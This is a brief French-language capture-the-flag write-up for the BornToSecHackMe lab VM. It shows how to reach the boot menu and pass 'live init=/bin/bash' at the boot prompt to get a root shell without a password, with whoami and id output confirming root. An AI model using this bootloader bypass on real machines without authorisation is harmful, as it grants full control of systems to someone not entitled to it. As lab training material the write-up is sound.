# Boot into Root Shell without Password
writeup 3

### Start virtual machine

En démarant la VM, appuyé sur la touche MAJ. On arrive aux options de boot.

### Commands

Cette commande va nous permettre de récupérer un shell root
```
boot: live init=/bin/bash
[...]
root@BornToSecHackMe:/# whoami
root
root@BornToSecHackMe:/# id
uid=0(root) gid=0(root) groups=0(root)
```

### Screenshot

![screenshot](../screen/writeup2.png?raw=true)
